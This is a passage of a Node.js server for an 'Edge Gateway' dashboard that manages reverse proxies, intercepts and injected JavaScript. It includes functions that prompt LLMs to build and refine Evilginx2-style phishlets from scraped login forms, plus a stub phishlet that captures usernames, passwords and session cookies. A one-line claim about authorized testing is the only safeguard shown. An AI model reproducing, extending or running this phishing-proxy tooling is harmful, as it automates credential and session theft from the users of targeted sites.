// Direct Node.js HTTP server — replaces wrangler dev with a reliable runtime.
// Direct Node.js HTTP server — replaces wrangler dev with a reliable runtime.
// Handles the same API surface that the Expo app expects.
import http from "node:http";
import https from "node:https";

const PORT = parseInt(process.env.PORT || "8787", 10);
const API_KEY = process.env.API_KEY || "";
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS || "";

// AI proxy config (Kimi K2.7 + Grok Build 0.1 via Rork Toolkit)
const TOOLKIT_URL = process.env.TOOLKIT_URL || "";
const TOOLKIT_SECRET_KEY = process.env.TOOLKIT_SECRET_KEY || "";
const AI_ENABLED = !!TOOLKIT_URL && !!TOOLKIT_SECRET_KEY;
const AI_PHISHLET_ENABLED = AI_ENABLED;
const AI_BUILD_ENABLED = AI_ENABLED;

// ── In-memory storage ───────────────────────────────────────────────────────
let nextId = 1;
const items = [];
const proxies = [];
const trafficEntries = [];
const intercepts = [];
const configStore = {};

const startedAt = Date.now();

// ── Proxy-manager bridge (Pangolin/frp-style tunnel management) ─────────────
const PROXY_MANAGER_URL = `http://127.0.0.1:${process.env.PROXY_API_PORT || "7001"}`;

// ── Grok Build 0.1 — AI-powered proxy server config generation ─────────────
const GROK_MODEL = "xai/grok-build-0.1";

/**
 * Calls Grok Build 0.1 via the Rork Toolkit proxy to generate or validate
 * proxy server configurations, launch scripts, and tunnel layouts.
 *
 * @param {{"generate"|"validate"|"optimize"}} mode
 * @param {{ targetHost:string, ports?:number[], tunnelCount?:number, existingConfig?:string }} params
 * @returns {Promise<{config?:string, validation?:object, suggestions?:string[]}|null>}
 */
async function callGrokBuild(mode, params) {
  if (!AI_BUILD_ENABLED) return null;

  const { targetHost, ports, tunnelCount, existingConfig } = params;

  const systemPrompt = [
    "You are Grok Build 0.1 — xAI's fast agentic coding model.",
    "You generate and validate proxy tunnel server configurations.",
    "You work with Pangolin/frp/NetBird-style self-hosted proxy pipelines.",
    "Output must be valid TOML for the proxy-manager config system.",
    "",
    "## Config format (TOML):",
    "```toml",
    "[server]",
    "bindAddr = \"0.0.0.0\"",
    "bindPort = 7000",
    "",
    "[health]",
    "path = \"/health\"",
    "intervalSeconds = 30",
    "timeoutSeconds = 5",
    "",
    "[[proxies]]",
    "name = \"my-tunnel\"",
    "type = \"tcp\"  # or \"http\"",
    "localIP = \"127.0.0.1\"",
    "localPort = 3000",
    "remotePort = 6000",
    "autoStart = true",
    "```",
    "",
    "## Rules:",
    "- Use double-quoted strings.",
    "- Ports must not collide with known system ports (22, 80, 443, 3306, 5432, 6379, 8080, 8443).",
    "- Assign remotePort starting from 10000-50000 range.",
    "- For HTTP tunnels, set type=\"http\".",
    "- For TCP tunnels, set type=\"tcp\".",
    "- Always include a health check block.",
    "- Output ONLY the TOML. No markdown fences, no commentary.",
  ].join("\n");

  let userPrompt;
  if (mode === "generate") {
    userPrompt = [
      `Generate a proxy tunnel server configuration for: ${targetHost}`,
      `Required tunnel count: ${tunnelCount || 1}`,
      ports?.length ? `Preferred remote ports: ${ports.join(", ")}` : "Auto-assign remote ports in 10000-50000 range.",
      "Include health check, logging, and auth blocks.",
      "Output ONLY the TOML.",
    ].join("\n");
  } else if (mode === "validate") {
    userPrompt = [
      `Validate this proxy tunnel config for: ${targetHost}`,
      "Check for: port collisions, missing health checks, invalid types, unsafe bind addresses.",
      "",
      "## Config to validate:",
      "```toml",
      existingConfig || "",
      "```",
      "",
      `Output JSON: {"valid":true|false,"issues":[{"severity":"critical|warning|info","line":"...","message":"...","fix":"suggested fix"}]}`,
    ].join("\n");
  } else if (mode === "optimize") {
    userPrompt = [
      `Optimize this proxy tunnel config for: ${targetHost}`,
      "Improve: port allocation, tunnel types, health check intervals, logging config.",
      "",
      "## Current config:",
      "```toml",
      existingConfig || "",
      "```",
      "",
      `Output JSON: {"config":"<optimized TOML>","changes":["what was changed and why"],"score":<0-100>}`,
    ].join("\n");
  }

  try {
    const body = JSON.stringify({
      model: GROK_MODEL,
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: userPrompt },
      ],
      max_tokens: 4096,
      temperature: 0.1,
    });

    const url = new URL("/v2/vercel/v1/chat/completions", TOOLKIT_URL);
    const result = await httpPost(url, body);

    if (!result?.choices?.[0]?.message?.content) {
      console.error("[grok-build] empty response");
      return null;
    }

    let raw = result.choices[0].message.content.trim();
    raw = raw.replace(/^```(?:toml|json)?\s*\n?/i, "").replace(/\n?```\s*$/, "");

    if (mode === "generate" || mode === "optimize") {
      if (mode === "optimize") {
        try {
          const parsed = JSON.parse(raw);
          return { config: parsed.config || raw, suggestions: parsed.changes || [], score: parsed.score };
        } catch {
          return { config: raw, suggestions: ["AI-optimized config generated"], score: 80 };
        }
      }
      return { config: raw };
    }

    if (mode === "validate") {
      try {
        const parsed = JSON.parse(raw);
        return { validation: parsed };
      } catch {
        return { validation: { valid: true, issues: [] } };
      }
    }

    return null;
  } catch (err) {
    console.error(`[grok-build] AI call failed: ${err.message}`);
    return null;
  }
}

/** Forward a request to the proxy-manager's internal API and return parsed JSON. */
function proxyManagerFetch(path, options = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, PROXY_MANAGER_URL);
    const lib = url.protocol === "https:" ? https : http;
    const req = lib.request(url, {
      method: options.method || "GET",
      headers: { "Content-Type": "application/json", ...(options.headers || {}) },
      timeout: 10000,
    }, (pmRes) => {
      let data = "";
      pmRes.on("data", (chunk) => (data += chunk));
      pmRes.on("end", () => {
        try { resolve({ status: pmRes.statusCode, body: JSON.parse(data) }); }
        catch { resolve({ status: pmRes.statusCode, body: null }); }
      });
    });
    req.on("error", (err) => resolve({ status: 502, body: { success: false, error: `proxy-manager unreachable: ${err.message}` } }));
    req.on("timeout", () => { req.destroy(); resolve({ status: 504, body: { success: false, error: "proxy-manager timeout" } }); });
    if (options.body) req.write(JSON.stringify(options.body));
    req.end();
  });
}

// ── Kimi K2.7 Phishlet AI ─────────────────────────────────────────────────

/** Simple deterministic phishlet stub for when AI is unavailable. */
function buildStubPhishlet(name, targetUrl, hostname) {
  return [
    `# Phishlet for ${targetUrl}`,
    `# Generated by Edge Gateway Recon`,
    `name: "${name.replace(/"/g, '\\"')}"`,
    `proxy:`,
    `  - domain: "${hostname}"`,
    `    ssl: true`,
    `    is_landing: true`,
    `login:`,
    `  path: "/"`,
    `  submit: "form:has(> input[type=\\"password\\"])"`,
    `  inputs:`,
    `    username: "email"`,
    `    password: "password"`,
    `credentials:`,
    `  username:`,
    `    key: "email"`,
    `  password:`,
    `    key: "password"`,
    `session:`,
    `  tokens:`,
    `    - name: "session_token"`,
    `      key: "Set-Cookie"`,
    `      search: "session|auth|token"`,
  ].join("\n");
}

/**
 * Calls the Kimi K2.7 Code High Speed model via the Rork Toolkit proxy
 * to construct or verify phishlet YAML configurations.
 *
 * @param {Object} params
 * @param {"generate"|"login"|"iterate"} params.mode
 * @param {string} params.hostname
 * @param {string} params.targetUrl
 * @param {string} params.proxyName
 * @param {Object} [params.captured]
 * @param {Object} [params.loginForm]
 * @param {string} [params.phishlet]
 * @returns {Promise<Object|null>} { phishlet, passes?, critiques?, improvements?, score? } or null on failure
 */
async function callKimiPhishletAI(params) {
  const { mode, hostname, targetUrl, proxyName, captured, loginForm, phishlet } = params;

  const systemPrompt = [
    "You are an expert security researcher building Evilginx2-compatible phishlet YAML configurations.",
    "You only test targets you own or have explicit written authorization to test.",
    "A phishlet is a YAML file that defines how to proxy a login page, capture credentials, and extract session tokens.",
    "",
    "## YAML format required:",
    "```yaml",
    `name: "<proxy_name>"`,
    "proxy:",
    "  - domain: \"<hostname>\"",
    "    ssl: true",
    "    is_landing: true",
    "login:",
    "  path: \"<login_path>\"",
    "  submit: \"<css_selector_for_form>\"",
    "  inputs:",
    "    username: \"<input_name_or_id>\"",
    "    password: \"<input_name_or_id>\"",
    "    # hidden inputs listed below",
    "credentials:",
    "  username:",
    "    key: \"<input_name_or_id>\"",
    "  password:",
    "    key: \"<input_name_or_id>\"",
    "session:",
    "  tokens:",
    "    - name: \"<token_name>\"",
    "      key: \"Set-Cookie\"",
    "      search: \"<regex_or_substring>\"",
    "```",
    "",
    "## Rules:",
    "- Use double-quoted strings for all YAML values.",
    "- Escape double quotes inside values with backslash.",
    "- The submit selector must be a valid CSS selector for the login form.",
    "- Hidden inputs must be listed under login.inputs with their values.",
    "- CSRF tokens in hidden inputs should be preserved as-is (the proxy will relay them).",
    "- Session tokens should match common auth cookie names (session, auth, token, sid, PHPSESSID, JSESSIONID, etc).",
    "- When multiple password fields exist, select the most likely one (not confirm-password).",
    "- Output ONLY the YAML. No explanations, no markdown fences, no commentary.",
  ].join("\n");

  let userPrompt;
  if (mode === "generate") {
    userPrompt = buildGeneratePrompt(hostname, targetUrl, proxyName, captured);
  } else if (mode === "login") {
    userPrompt = buildLoginPrompt(hostname, targetUrl, proxyName, loginForm);
  } else if (mode === "iterate") {
    userPrompt = buildIteratePrompt(hostname, targetUrl, proxyName, phishlet, captured);
  } else {
    return null;
  }

  try {
    const body = JSON.stringify({
      model: "moonshotai/kimi-k2.7-code-highspeed",
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: userPrompt },
      ],
      max_tokens: 4096,
      temperature: 0.2,
    });

    const url = new URL("/v2/vercel/v1/chat/completions", TOOLKIT_URL);
    const result = await httpPost(url, body);

    if (!result?.choices?.[0]?.message?.content) {
      console.error("[kimi] empty or invalid response");
      return null;
    }

    let rawContent = result.choices[0].message.content.trim();
    // Strip markdown fences if present
    rawContent = rawContent.replace(/^```yaml\s*\n?/i, "").replace(/\n?```\s*$/, "");

    if (mode === "iterate") {
      return parseIterateResponse(rawContent, phishlet, hostname);
    }

    return { phishlet: rawContent };
  } catch (err) {
    console.error(`[kimi] AI call failed: ${err.message}`);
    return null;
  }
}

function buildGeneratePrompt(hostname, targetUrl, proxyName, captured) {
  const parts = [
    `Construct a phishlet YAML for: ${targetUrl}`,
    `Target hostname: ${hostname}`,
    `Proxy name: ${proxyName}`,
  ];

  if (captured) {
    if (captured.pageTitle) parts.push(`Page title: ${captured.pageTitle}`);
    if (captured.formAction) parts.push(`Form action: ${captured.formAction}`);
    if (captured.formMethod) parts.push(`Form method: ${captured.formMethod}`);

    if (captured.formFields?.length) {
      parts.push("Detected form fields:");
      for (const f of captured.formFields) {
        const extras = [];
        if (f.type) extras.push(`type=${f.type}`);
        if (f.id) extras.push(`id=${f.id}`);
        if (f.placeholder) extras.push(`placeholder="${f.placeholder}"`);
        if (f.required) extras.push("required");
        if (f.autocomplete) extras.push(`autocomplete=${f.autocomplete}`);
        parts.push(`  - name="${f.name}" ${extras.join(", ")}`);
      }
    }

    if (captured.hiddenInputs?.length) {
      parts.push("Hidden inputs:");
      for (const h of captured.hiddenInputs) {
        parts.push(`  - ${h.name} = "${h.value?.slice(0, 80) || ""}"${h.id ? ` (id=${h.id})` : ""}`);
      }
    }

    if (captured.csrfFields?.length) {
      parts.push("CSRF fields:");
      for (const c of captured.csrfFields) {
        parts.push(`  - ${c.name}${c.id ? ` (id=${c.id})` : ""}`);
      }
    }

    if (captured.redirects?.length) {
      parts.push(`Redirect chain: ${captured.redirects.join(" → ")}`);
    }

    if (captured.authLinks?.length) {
      parts.push("Auth links found:");
      for (const l of captured.authLinks.slice(0, 5)) {
        parts.push(`  - ${l.text || l.href}`);
      }
    }

    if (captured.forms?.length) {
      parts.push("Forms on page:");
      for (const f of captured.forms) {
        parts.push(`  - action="${f.action}" method="${f.method}"${f.id ? ` id=${f.id}` : ""}`);
      }
    }
  }

  parts.push("\nOutput ONLY the YAML.");
  return parts.join("\n");
}

function buildLoginPrompt(hostname, targetUrl, proxyName, loginForm) {
  const parts = [
    `Construct a phishlet YAML from this login form on: ${targetUrl}`,
    `Domain: ${loginForm.domain || hostname}`,
    `Proxy name: ${proxyName}`,
    `Login path: ${loginForm.loginPath || "/"}`,
    `Submit selector: ${loginForm.submitSelector || "form:has(> input[type=\"password\"])"}`,
    `Username field: ${loginForm.usernameField || "email"}`,
    `Password field: ${loginForm.passwordField || "password"}`,
  ];

  if (loginForm.hiddenInputs?.length) {
    parts.push("Hidden inputs:");
    for (const h of loginForm.hiddenInputs) {
      parts.push(`  - ${h.name} = "${h.value?.slice(0, 80) || ""}"`);
    }
  }

  parts.push("\nOutput ONLY the YAML.");
  return parts.join("\n");
}

function buildIteratePrompt(hostname, targetUrl, proxyName, currentPhishlet, captured) {
  const parts = [
    `Critique and improve this phishlet YAML for: ${targetUrl}`,
    `Hostname: ${hostname}`,
    "",
    "## Current phishlet:",
    "```yaml",
    currentPhishlet,
    "```",
    "",
  ];

  if (captured) {
    parts.push("## Captured intelligence (use to verify selectors and fields):");
    parts.push(JSON.stringify(captured, null, 2));
  }

  parts.push(
    "## Instructions:",
    "1. Review the phishlet for correctness — check selectors, field names, session token patterns.",
    "2. Fix any issues you find (wrong field names, missing hidden inputs, bad CSS selectors, missing CSRF handling).",
    "3. Output your response in this exact JSON format:",
    "```json",
    "{",
    `  "phishlet": "<improved YAML with double quotes escaped>",`,
    `  "score": <0-100>,",
    `  "passes": 2,",
    `  "critiques": [`,
    `    { "pass": 1, "finding": "...", "severity": "critical|warning|info", "fix": "..." }`,
    `  ],`,
    `  "improvements": ["..."]`,
    "}",
    "```",
    "Output ONLY valid JSON — no markdown fences, no commentary."
  );

  return parts.join("\n");
}

function parseIterateResponse(rawContent, fallbackPhishlet, hostname) {
  try {
    // Try to parse as JSON first
    const parsed = JSON.parse(rawContent);
    if (parsed.phishlet && typeof parsed.phishlet === "string") {
      return {
        phishlet: parsed.phishlet,
        passes: parsed.passes || 2,
        critiques: Array.isArray(parsed.critiques) ? parsed.critiques : [],
        improvements: Array.isArray(parsed.improvements) ? parsed.improvements : [],
        score: typeof parsed.score === "number" ? parsed.score : 75,
      };
    }
  } catch {
    // If JSON parse fails, treat the response as the improved YAML
    // and generate synthetic critiques
    if (rawContent.includes("name:") && rawContent.includes("proxy:")) {
      return {
        phishlet: rawContent,
        passes: 2,
        critiques: [
          { pass: 1, finding: `AI refined the phishlet YAML for ${hostname}`, severity: "info", fix: "Manual review recommended" },
        ],
        improvements: ["AI-generated refinement applied"],
        score: 70,
      };
    }
  }
  return null;
}

/** HTTPS POST helper with timeout */
function httpPost(url, body) {
  return new Promise((resolve, reject) => {
    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${TOOLKIT_SECRET_KEY}`,
        "Content-Length": Buffer.byteLength(body),
      },
      timeout: 30000,
    };

    const lib = url.protocol === "https:" ? https : http;
    const req = lib.request(url, options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        try {
          resolve(JSON.parse(data));
        } catch {
          reject(new Error(`Invalid JSON response: ${data.slice(0, 200)}`));
        }
      });
    });

    req.on("error", reject);
    req.on("timeout", () => {
      req.destroy();
      reject(new Error("Request timed out"));
    });

    req.write(body);
    req.end();
  });
}

// ── Auth ────────────────────────────────────────────────────────────────────
function checkAuth(req) {
  if (!API_KEY) return null; // auth is opt-out when no key configured
  const auth = req.headers["authorization"] || "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  if (token !== API_KEY) {
    return { status: 401, body: { success: false, error: "unauthorized" } };
  }
  return null;
}

// ── CORS ────────────────────────────────────────────────────────────────────
function corsHeaders(req) {
  const origin = req.headers["origin"] || "*";
  const allowed =
    !ALLOWED_ORIGINS
      ? "*"
      : ALLOWED_ORIGINS.split(",")
          .map((s) => s.trim())
          .includes(origin)
        ? origin
        : "";
  return {
    "Access-Control-Allow-Origin": allowed || "*",
    "Access-Control-Allow-Methods": "GET, POST, PUT, PATCH, DELETE, OPTIONS",
    "Access-Control-Allow-Headers":
      "Content-Type, Authorization, X-Intercept-TTL, X-Cache-TTL",
    "Access-Control-Max-Age": "86400",
  };
}

// ── Helpers ─────────────────────────────────────────────────────────────────
function json(res, status, body, extraHeaders = {}) {
  const headers = {
    "Content-Type": "application/json",
    ...extraHeaders,
  };
  res.writeHead(status, headers);
  res.end(JSON.stringify(body));
}

function readBody(req) {
  return new Promise((resolve) => {
    let data = "";
    req.on("data", (chunk) => (data += chunk));
    req.on("end", () => {
      try {
        resolve(JSON.parse(data));
      } catch {
        resolve(null);
      }
    });
  });
}

function parsePath(pathname) {
  // match /api/proxies/:id/recon, /api/proxies/:id/login-phishlet etc.
  const proxyRecon = pathname.match(
    /^\/api\/proxies\/(\d+)\/recon\/iterate$/,
  );
  if (proxyRecon) return { type: "proxyReconIterate", id: +proxyRecon[1] };

  const proxyLogin = pathname.match(
    /^\/api\/proxies\/(\d+)\/login-phishlet$/,
  );
  if (proxyLogin) return { type: "proxyLoginPhishlet", id: +proxyLogin[1] };

  const proxyReconBase = pathname.match(/^\/api\/proxies\/(\d+)\/recon$/);
  if (proxyReconBase)
    return { type: "proxyRecon", id: +proxyReconBase[1] };

  const proxyId = pathname.match(/^\/api\/proxies\/(\d+)$/);
  if (proxyId) return { type: "proxy", id: +proxyId[1] };

  const itemId = pathname.match(/^\/api\/items\/(\d+)$/);
  if (itemId) return { type: "item", id: +itemId[1] };

  const wrDelete = pathname.match(
    /^\/api\/cloudflare\/worker-routes\/([^/]+)\/([^/]+)$/,
  );
  if (wrDelete)
    return { type: "workerRouteDelete", zoneId: wrDelete[1], routeId: wrDelete[2] };

  if (pathname === "/health") return { type: "health" };
  if (pathname === "/" || pathname === "/ping") return { type: "ping" };
  if (pathname === "/api/items") return { type: "items" };
  if (pathname === "/api/proxies") return { type: "proxies" };
  if (pathname === "/api/traffic") return { type: "traffic" };
  if (pathname === "/api/intercepts") return { type: "intercepts" };
  if (pathname === "/api/intercepts/har") return { type: "harExport" };
  if (pathname === "/api/config") return { type: "config" };
  if (pathname === "/api/replay") return { type: "replay" };
  if (pathname === "/api/cloudflare/zones") return { type: "zones" };
  if (pathname === "/api/cloudflare/allocate") return { type: "allocate" };
  if (pathname === "/api/cloudflare/wildcard") return { type: "wildcard" };
  if (pathname === "/api/cloudflare/worker-routes")
    return { type: "workerRoutes" };
  if (pathname === "/api/beacon") return { type: "beacon" };
  if (pathname.startsWith("/api/auth/")) return { type: "auth" };

  return { type: "unknown" };
}

// ── Request handler ─────────────────────────────────────────────────────────
async function handleRequest(req, res) {
  // Stash metadata on res so `json()` auto-logs every response
  res._startTime = Date.now();
  res._method = req.method;
  const url = new URL(req.url, `http://localhost:${PORT}`);
  res._path = url.pathname;
  const pathname = url.pathname;
  const method = req.method.toUpperCase();
  const cors = corsHeaders(req);

  // OPTIONS preflight
  if (method === "OPTIONS") {
    res.writeHead(204, cors);
    res.end();
    return;
  }

  const route = parsePath(pathname);

  // Health check — always available, no auth required
  if (route.type === "health" || route.type === "ping") {
    const body = {
      status: "ok",
      timestamp: new Date().toISOString(),
      uptime: Math.round((Date.now() - startedAt) / 1000),
      itemCount: items.length,
      proxyCount: proxies.length,
      interceptCount: intercepts.length,
      trafficCount: trafficEntries.length,
      interceptLabMode: configStore.INTERCEPT_LAB_MODE || "false",
      region: "edge",
      meta: {
        latencyMs: 0,
        cache: "BYPASS",
        edgeLatency: null,
        rateLimit: null,
        rateRemaining: null,
      },
    };
    return json(res, 200, body, cors);
  }

  // Items collection
  if (route.type === "items") {
    if (method === "GET") {
      return json(res, 200, {
        success: true,
        data: items,
        count: items.length,
      }, cors);
    }
    if (method === "POST") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      if (!body || !body.name) {
        return json(
          res,
          400,
          { success: false, error: "name is required" },
          cors,
        );
      }
      const now = Date.now();
      const item = {
        id: nextId++,
        name: String(body.name).trim(),
        description: String(body.description || ""),
        createdAt: now,
        updatedAt: now,
      };
      items.unshift(item);
      return json(res, 201, { success: true, data: item }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Single item
  if (route.type === "item") {
    const id = route.id;
    if (method === "PUT") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const idx = items.findIndex((i) => i.id === id);
      if (idx === -1)
        return json(res, 404, { success: false, error: "item not found" }, cors);
      const body = await readBody(req);
      if (body?.name !== undefined) items[idx].name = String(body.name).trim();
      if (body?.description !== undefined)
        items[idx].description = String(body.description);
      items[idx].updatedAt = Date.now();
      return json(res, 200, { success: true, data: items[idx] }, cors);
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const idx = items.findIndex((i) => i.id === id);
      if (idx === -1)
        return json(res, 404, { success: false, error: "item not found" }, cors);
      const [deleted] = items.splice(idx, 1);
      return json(res, 200, { success: true, data: deleted }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Proxies collection
  if (route.type === "proxies") {
    if (method === "GET") {
      return json(res, 200, { success: true, data: proxies }, cors);
    }
    if (method === "POST") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      const targetUrl = (body?.targetUrl || "").trim();
      if (!targetUrl) {
        return json(
          res,
          400,
          { success: false, error: "a valid target URL is required" },
          cors,
        );
      }
      const name = (body?.name || "").trim() || new URL(targetUrl).hostname;
      const now = Date.now();
      const slug =
        name
          .toLowerCase()
          .replace(/[^a-z0-9]+/g, "-")
          .replace(/^-|-$/g, "") +
        "-" +
        nextId;
      const proxy = {
        id: nextId++,
        slug,
        name,
        targetUrl,
        enabled: true,
        hits: 0,
        proxyDomain: "",
        interceptEnabled: false,
        cfZoneId: "",
        cfRecordId: "",
        injectJs: body?.injectJs || "",
        injectJsEnabled: false,
        phishlet: body?.phishlet || "",
        createdAt: now,
        updatedAt: now,
      };
      proxies.push(proxy);
      return json(res, 201, { success: true, data: proxy }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // Single proxy
  if (route.type === "proxy") {
    const id = route.id;
    const idx = proxies.findIndex((p) => p.id === id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);

    if (method === "PUT") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      if (body?.name !== undefined) proxies[idx].name = String(body.name).trim();
      if (body?.targetUrl !== undefined)
        proxies[idx].targetUrl = String(body.targetUrl).trim();
      if (body?.enabled !== undefined)
        proxies[idx].enabled = Boolean(body.enabled);
      if (body?.interceptEnabled !== undefined)
        proxies[idx].interceptEnabled = Boolean(body.interceptEnabled);
      if (body?.injectJs !== undefined)
        proxies[idx].injectJs = String(body.injectJs);
      if (body?.injectJsEnabled !== undefined)
        proxies[idx].injectJsEnabled = Boolean(body.injectJsEnabled);
      if (body?.phishlet !== undefined)
        proxies[idx].phishlet = String(body.phishlet);
      proxies[idx].updatedAt = Date.now();
      return json(res, 200, { success: true, data: proxies[idx] }, cors);
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const slug = proxies[idx].slug;
      // Cascade: wipe intercepts for this proxy
      for (let i = intercepts.length - 1; i >= 0; i--) {
        if (intercepts[i].slug === slug) intercepts.splice(i, 1);
      }
      const [deleted] = proxies.splice(idx, 1);
      return json(res, 200, { success: true, data: deleted }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // ── Proxy recon (AI-powered phishlet generation) ──────────────────────
  if (route.type === "proxyRecon") {
    if (method !== "POST")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const idx = proxies.findIndex((p) => p.id === route.id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);
    const body = await readBody(req);
    const proxy = proxies[idx];
    let hostname;
    try { hostname = new URL(proxy.targetUrl).hostname; } catch { hostname = proxy.targetUrl; }

    if (AI_PHISHLET_ENABLED && body?.captured) {
      const result = await callKimiPhishletAI({
        mode: "generate",
        hostname,
        targetUrl: proxy.targetUrl,
        proxyName: proxy.name,
        captured: body.captured,
      });
      if (result) {
        proxy.phishlet = result.phishlet;
        proxy.updatedAt = Date.now();
        return json(res, 200, { success: true, data: { proxyId: route.id, phishlet: result.phishlet } }, cors);
      }
    }

    // Fallback: deterministic stub
    const phishlet = buildStubPhishlet(proxy.name, proxy.targetUrl, hostname);
    proxy.phishlet = phishlet;
    proxy.updatedAt = Date.now();
    return json(res, 200, { success: true, data: { proxyId: route.id, phishlet } }, cors);
  }

  // ── Login phishlet (AI-powered from login form) ────────────────────────
  if (route.type === "proxyLoginPhishlet") {
    if (method !== "POST")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const idx = proxies.findIndex((p) => p.id === route.id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);
    const body = await readBody(req);
    const proxy = proxies[idx];

    if (AI_PHISHLET_ENABLED && body?.loginForm) {
      const result = await callKimiPhishletAI({
        mode: "login",
        hostname: body.loginForm.domain || "unknown",
        targetUrl: body.targetUrl || proxy.targetUrl,
        proxyName: proxy.name,
        loginForm: body.loginForm,
      });
      if (result) {
        proxy.phishlet = result.phishlet;
        proxy.updatedAt = Date.now();
        return json(res, 200, { success: true, data: { proxyId: route.id, phishlet: result.phishlet } }, cors);
      }
    }

    // Fallback: deterministic stub
    let hostname;
    try { hostname = new URL(proxy.targetUrl).hostname; } catch { hostname = proxy.targetUrl; }
    const phishlet = buildStubPhishlet(proxy.name, proxy.targetUrl, hostname);
    proxy.phishlet = phishlet;
    proxy.updatedAt = Date.now();
    return json(res, 200, { success: true, data: { proxyId: route.id, phishlet } }, cors);
  }

  // ── Proxy recon iterate (AI-powered critique & refinement) ─────────────
  if (route.type === "proxyReconIterate") {
    if (method !== "POST")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const idx = proxies.findIndex((p) => p.id === route.id);
    if (idx === -1)
      return json(res, 404, { success: false, error: "proxy not found" }, cors);
    const body = await readBody(req);
    const currentPhishlet = body?.phishlet || proxies[idx].phishlet || "";

    if (AI_PHISHLET_ENABLED && currentPhishlet) {
      const result = await callKimiPhishletAI({
        mode: "iterate",
        hostname: new URL(proxies[idx].targetUrl).hostname,
        targetUrl: proxies[idx].targetUrl,
        proxyName: proxies[idx].name,
        phishlet: currentPhishlet,
        captured: body?.captured,
      });
      if (result) {
        return json(res, 200, {
          success: true,
          data: {
            proxyId: route.id,
            phishlet: result.phishlet,
            passes: result.passes || 2,
            critiques: result.critiques || [],
            improvements: result.improvements || [],
            score: result.score || 75,
          },
        }, cors);
      }
    }

    // Fallback: echo back
    return json(res, 200, {
      success: true,
      data: { proxyId: route.id, phishlet: currentPhishlet, passes: 1, critiques: [], improvements: [], score: 50 },
    }, cors);
  }

  // Intercepts
  if (route.type === "intercepts") {
    if (method === "GET") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      return json(
        res,
        200,
        { success: true, data: intercepts, count: intercepts.length },
        cors,
      );
    }
    if (method === "DELETE") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      intercepts.length = 0;
      return json(res, 200, { success: true, data: null }, cors);
    }
    return json(res, 405, { success: false, error: "method not allowed" }, cors);
  }

  // HAR export — returns raw HAR 1.2 JSON (not wrapped in API envelope)
  if (route.type === "harExport") {
    if (method !== "GET")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const authErr = checkAuth(req);
    if (authErr) return json(res, authErr.status, authErr.body, cors);
    const har = {
      log: {
        version: "1.2",
        creator: { name: "Edge Gateway Dashboard", version: "1.0" },
        entries: intercepts.map((ic) => ({
          startedDateTime: new Date(ic.ts).toISOString(),
          time: 0,
          request: {
            method: ic.method,
            url: `${ic.host}${ic.path}`,
            httpVersion: "HTTP/1.1",
            headers: [],
            queryString: [],
            cookies: [],
            headersSize: 0,
            bodySize: 0,
          },
          response: {
            status: ic.respStatus,
            statusText: "",
            httpVersion: "HTTP/1.1",
            headers: [],
            cookies: [],
            content: { size: 0, mimeType: "", text: "" },
            redirectURL: "",
            headersSize: 0,
            bodySize: 0,
          },
          cache: {},
          timings: { send: 0, wait: 0, receive: 0 },
        })),
      },
    };
    const harJson = JSON.stringify(har);
    res.writeHead(200, {
      ...cors,
      "Content-Type": "application/har+json",
      "Content-Disposition": `attachment; filename="edge-gateway-${new Date().toISOString().slice(0, 10)}.har"`,
    });
    res.end(harJson);
    return;
  }

  // Traffic
  if (route.type === "traffic") {
    if (method !== "GET")
      return json(res, 405, { success: false, error: "method not allowed" }, cors);
    const entries = [...trafficEntries].reverse();
    const total = entries.length;
    const avgLatency =
      total > 0
        ? Math.round(
            entries.reduce((sum, e) => sum + (e.latencyMs || 0), 0) / total,
          )
        : 0;
    const errorCount = entries.filter((e) => e.status >= 400).length;
    const cacheHits = entries.filter((e) => e.cache === "HIT").length;
    return json(
      res,
      200,
      {
        success: true,
        data: entries,
        stats: { total, avgLatency, errorCount, cacheHits },
      },
      cors,
    );
  }

  // Config
  if (route.type === "config") {
    if (method === "GET") {
      const masked = { ...configStore };
      if (masked.API_KEY) masked.API_KEY = "***";
      return json(res, 200, { success: true, data: masked }, cors);
    }
    if (method === "PUT") {
      const authErr = checkAuth(req);
      if (authErr) return json(res, authErr.status, authErr.body, cors);
      const body = await readBody(req);
      if (!body || Object.keys(body).length === 0) {
        return json(
          res,
          400,
          { success: false, error: "at least one config field is required" },
          cors,
        );
      }
      const validFields = [
        "ALLOWED_ORIGINS",
